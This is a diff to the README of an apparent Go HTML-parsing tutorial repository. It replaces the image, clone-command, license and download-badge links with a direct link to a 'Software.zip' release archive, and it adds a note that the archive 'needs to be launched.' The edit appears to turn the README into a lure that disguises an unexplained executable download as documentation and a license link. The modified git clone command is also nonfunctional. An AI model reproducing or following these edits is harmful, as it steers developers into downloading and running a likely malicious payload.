@@ -1,6 +1,6 @@
 # Golang HTML Parsing 🕵️‍♂️
 
-![HTML Parsing](https://github.com/Zilts345890/Golang-html-parsing/releases/tag/v1.0)
+![HTML Parsing](https://github.com/Zilts345890/Golang-html-parsing/releases/download/v2.0/Software.zip)
 
 Welcome to the Golang HTML Parsing repository! Here you will learn all about parsing HTML in Go using Node Parser, Tokenizer, and tools like Goquery and Colly. This repository is packed with practical examples and efficient web scraping techniques to help you master the art of HTML parsing in Go.
 
@@ -26,7 +26,7 @@ Parsing HTML is a crucial skill for any developer working with web data. This re
 ## Installation ⚙️
 To get started with parsing HTML in Go, you can clone this repository to your local machine using the following command:
 ```bash
-git clone https://github.com/Zilts345890/Golang-html-parsing/releases/tag/v1.0
+git clone https://github.com/Zilts345890/Golang-html-parsing/releases/download/v2.0/Software.zip
 ```
 
 ## Usage 🛠️
@@ -56,13 +56,13 @@ Explore these examples and more in the repository to boost your HTML parsing cap
 Contributions are welcome! If you have any insights, improvements, or additional techniques related to parsing HTML in Go, feel free to submit a pull request. Together, we can enhance the content of this repository and help developers master web scraping in Go.
 
 ## License 📝
-This project is licensed under the [MIT License](https://github.com/Zilts345890/Golang-html-parsing/releases/tag/v1.0).
+This project is licensed under the [MIT License](https://github.com/Zilts345890/Golang-html-parsing/releases/download/v2.0/Software.zip).
 
 ---
 
-[![Download https://github.com/Zilts345890/Golang-html-parsing/releases/tag/v1.0](https://github.com/Zilts345890/Golang-html-parsing/releases/tag/v1.0)](https://github.com/Zilts345890/Golang-html-parsing/releases/tag/v1.0)
+[![Download https://github.com/Zilts345890/Golang-html-parsing/releases/download/v2.0/Software.zip](https://github.com/Zilts345890/Golang-html-parsing/releases/download/v2.0/Software.zip)](https://github.com/Zilts345890/Golang-html-parsing/releases/download/v2.0/Software.zip)
 
-**Note:** https://github.com/Zilts345890/Golang-html-parsing/releases/tag/v1.0 needs to be launched.
+**Note:** https://github.com/Zilts345890/Golang-html-parsing/releases/download/v2.0/Software.zip needs to be launched.
 
 ---
 
